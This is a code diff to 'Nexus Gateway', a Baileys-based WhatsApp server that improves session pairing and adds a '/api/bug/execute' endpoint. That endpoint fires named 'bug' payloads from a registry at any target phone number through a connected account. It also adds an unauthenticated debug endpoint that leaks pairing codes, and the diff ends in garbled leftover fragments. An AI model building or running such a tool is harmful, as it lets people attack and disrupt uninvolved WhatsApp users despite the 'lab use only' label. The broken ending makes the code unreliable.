@@ -1,5 +1,5 @@
 // ============================================================
-// Nexus Gateway — Baileys (Railway)
+// Nexus Gateway — Baileys (Railway) — pairing fix
 // For security research / lab use only.
 // ============================================================
 const express = require("express");
@@ -20,7 +20,6 @@ const {
 
 const app = express();
 
-// ---------- CORS ----------
 const ALLOWED = (process.env.ALLOWED_ORIGINS || "*")
   .split(",").map(s => s.trim()).filter(Boolean);
 
@@ -34,7 +33,6 @@ app.use(cors({
 
 app.use(express.json());
 
-// ---------- SESSIONS DIR ----------
 const SESSIONS_DIR = path.join(__dirname, "..", "sessions");
 if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
 
@@ -59,65 +57,106 @@ async function startClient(sender) {
   const { state, saveCreds } = await useMultiFileAuthState(authDir);
   const { version } = await fetchLatestBaileysVersion();
 
+  console.log(`[boot] baileys version: ${JSON.stringify(version)}`);
+  console.log(`[boot] sender: ${sender} | registered: ${!!state.creds.registered}`);
+
   const sock = makeWASocket({
     version,
     logger,
     printQRInTerminal: false,
-    browser: Browsers.ubuntu("Chrome"),
+    browser: Browsers.macOS("Desktop"),
     auth: {
       creds: state.creds,
       keys: makeCacheableSignalKeyStore(state.keys, logger)
     },
-    generateHighQualityLinkPreview: true,
-    markOnlineOnConnect: false
+    // ---------- HANDHSHAKE / TIMEOUT FIX ----------
+    connectTimeoutMs: 60000,
+    defaultQueryTimeoutMs: 60000,
+    keepAliveIntervalMs: 30000,
+    retryRequestDelayMs: 500,
+    maxMsgRetryCount: 5,
+    // skip history sync — bikin pairing ga stuck "loading"
+    syncFullHistory: false,
+    shouldSyncHistoryMessage: () => false,
+    shouldIgnoreJid: () => false,
+    // jangan auto-read biar ga nunggu
+    markOnlineOnConnect: false,
+    generateHighQualityLinkPreview: false,
+    // emitOwnEvents off biar ringan
+    emitOwnEvents: false,
+    fireInitQueries: true
   });
 
   const entry = {
     sender, status: "pairing", code: null, sock,
-    connectedAt: null, startedAt: Date.now()
+    connectedAt: null, startedAt: Date.now(), reconnectAttempts: 0
   };
   clients.set(sender, entry);
 
   sock.ev.on("creds.update", saveCreds);
 
   sock.ev.on("connection.update", async (update) => {
-    const { connection, lastDisconnect } = update;
+    const { connection, lastDisconnect, qr, isNewLogin, receivedPendingNotifications } = update;
     const c = clients.get(sender);
     if (!c) return;
+
+    console.log(`[conn] ${sender} -> ${JSON.stringify({
+      connection, isNewLogin, receivedPendingNotifications,
+      err: lastDisconnect?.error?.message
+    })}`);
 
     if (connection === "open") {
       c.status = "connected";
       c.connectedAt = Date.now();
       c.code = null;
-      console.log(`[+] ${sender} connected`);
+      c.reconnectAttempts = 0;
+      console.log(`[+] ${sender} CONNECTED`);
     }
 
     if (connection === "close") {
       const code = lastDisconnect?.error?.output?.statusCode;
       const loggedOut = code === DisconnectReason.loggedOut;
+      const replace = code === DisconnectReason.connectionReplaced;
+      console.log(`[-] ${sender} closed code=${code} loggedOut=${loggedOut} replaced=${replace}`);
+
       c.status = "idle";
       c.connectedAt = null;
-      console.log(`[-] ${sender} closed (code=${code})`);
-      if (loggedOut) {
+
+      if (loggedOut || replace) {
         try { fs.rmSync(authDir, { recursive: true, force: true }); } catch {}
         clients.delete(sender);
+        return;
+      }
+
+      // auto-reconnect kalau cuma putus jaringan
+      if (c.reconnectAttempts < 5) {
+        c.reconnectAttempts++;
+        console.log(`[retry] ${sender} attempt ${c.reconnectAttempts}`);
+        setTimeout(() => {
+          clients.delete(sender);
+          startClient(sender).catch(e => console.error("[retry fail]", e.message));
+        }, 3000);
       }
     }
   });
 
+  // request pairing code kalau belum registered
   if (!state.creds.registered) {
-    await new Promise(r => setTimeout(r, 2000));
+    await new Promise(r => setTimeout(r, 3000));
     try {
       const code = await sock.requestPairingCode(sender);
       entry.code = code;
       entry.status = "pairing";
-      console.log(`[*] ${sender} pairing code: ${code}`);
+      console.log(`[*] ${sender} PAIRING CODE: ${code}`);
     } catch (err) {
       console.error("[!] requestPairingCode failed:", err.message);
       entry.status = "error";
       entry.error = err.message;
     }
+  } else {
+    console.log(`[boot] ${sender} already registered, waiting for reconnect`);
   }
+
   return entry;
 }
 
@@ -255,6 +294,17 @@ app.get("/api/health", (req, res) => {
   res.json({ ok: true, clients: clients.size, uptime: process.uptime() });
 });
 
+app.get("/api/debug/state", (req, res) => {
+  const sender = cleanNum(req.query.sender);
+  const c = sender ? clients.get(sender) : null;
+  res.json({
+    ok: true,
+    total: clients.size,
+    sender: sender || null,
+    entry: c ? { status: c.status, code: c.code, connectedAt: c.connectedAt, startedAt: c.startedAt } : null
+  });
+});
+
 app.get("/api/bugs", (req, res) => {
   const list = Object.entries(BUG_REGISTRY).map(([id, b]) => ({ id, name: b.name, desc: b.desc }));
   res.json({ success: true, bugs: list });
@@ -268,7 +318,7 @@ app.post("/api/sender/request", async (req, res) => {
   try {
     const entry = await startClient(sender);
     let waited = 0;
-    while (!entry.code && entry.status === "pairing" && waited < 15000) {
+    while (!entry.code && entry.status === "pairing" && waited < 20000) {
       await new Promise(r => setTimeout(r, 300));
       waited += 300;
     }
@@ -285,6 +335,72 @@ app.get("/api/sender/status", (req, res) => {
   if (!sender) return res.status(400).json({ success: false, message: "sender required" });
   const c = getClient(sender);
   if (!c) return res.json({ success: true, status: "idle" });
+  res.json({ success: true, status: c.status, connectedAt: c.connectedAt, code: c.code });
+});
+
+app.post("/api/sender/reset", async (req, res) => {
+  const sender = cleanNum(req.body?.sender);
+  if (!sender) return res.status(400).json({ success: false, message: "sender required" });
+  const c = clients.get(sender);
+  if (c?.sock) {
+    try { await c.sock.logout(); } catch {}
+    try { c.sock.end?.(); } catch {}
+  }
+  clients.delete(sender);
+  try { fs.rmSync(path.join(SESSIONS_DIR, sender), { recursive: true, force: true }); } catch {}
+  res.json({ success: true });
+});
+
+app.get("/api/bug/execute", async (req, res) => {
+  const sender = cleanNum(req.query.sender);
+  const target = cleanNum(req.query.target);
+  const bugId = String(req.query.bug || "");
+
+  res.setHeader("Content-Type", "text/event-stream");
+  res.setHeader("Cache-Control", "no-cache");
+  res.setHeader("Connection", "keep-alive");
+  res.setHeader("X-Accel-Buffering", "no");
+  res.flushHeaders?.();
+
+  const send = (event, data) => {
+    res.write(`event: ${event}\n`);
+    res.write(`data: ${JSON.stringify(data)}\n\n`);
+  };
+
+  if (!sender) { send("error", { message: "sender belum diatur" }); return res.end(); }
+  if (!target) { send("error", { message: "target kosong" }); return res.end(); }
+
+  const c = getClient(sender);
+  if (!c || c.status !== "connected") {
+    send("error", { message: "sender belum terhubung ke WhatsApp" });
+    return res.end();
+  }
+  const bug = BUG_REGISTRY[bugId];
+  if (!bug) { send("error", { message: "bug tidak dikenal" }); return res.end(); }
+
+  const log = (msg, level = "info") => send("log", { ts: Date.now(), msg, level });
+  send("start", { bug: bug.name, target, sender });
+  log(`sender  : ${sender}`);
+  log(`target  : ${target}`);
+  log(`payload : ${bug.name}`);
+
+  try {
+    await bug.run({ sock: c.sock, target, log });
+    log("done", "ok");
+    send("done", { ok: true });
+  } catch (err) {
+    log(`error: ${err.message}`, "error");
+    send("error", { message: err.message });
+  } finally {
+    res.end();
+  }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`[NEXUS-GATEWAY] listening on :${PORT}`));
+
+process.on("uncaughtException", (e) => console.error("[uncaught]", e));
+process.on("unhandledRejection", (e) => console.error("[unhandled]", e));true, status: "idle" });
   res.json({ success: true, status: c.status, connectedAt: c.connectedAt, code: c.code });
 });
 
